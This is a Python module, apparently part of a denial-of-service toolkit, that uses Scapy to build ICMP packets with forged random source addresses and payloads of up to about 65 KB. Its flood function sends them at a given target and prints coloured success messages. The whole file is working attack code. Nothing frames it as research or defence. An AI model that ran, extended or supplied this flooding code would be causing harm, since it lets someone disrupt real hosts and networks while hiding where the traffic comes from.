import random
from bin.addons.utils import random_IP
from scapy.layers.inet import ICMP, IP
from scapy.sendrecv import send
from stringcolor import *

__junk = list("1234567890qwertyuiopasdfghjklzxcvbnm")

red = "#ff0033"
green = "#02f93c"
yellow = "#eefc32"
blue = "\033[38;5;51m"


def flood(target):
    rand_addr = random_IP()
    ip_hdr = IP(src=rand_addr, dst=target[0])
    junk_size = random.randrange(50000, 65535)
    packet = ip_hdr/ICMP()/(random.choice(__junk)*junk_size)
    for i in range(4):
        try:
            send(packet, verbose=False)
        except Exception as e:
            print(
                f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('While sending packget', yellow)}\n{e}")
        else:
            print(
                f"{cs(f'[✔] SUCCESS', green)} {cs(f'Packget send! Payload size:', yellow)} {blue}{junk_size}\033[0m")
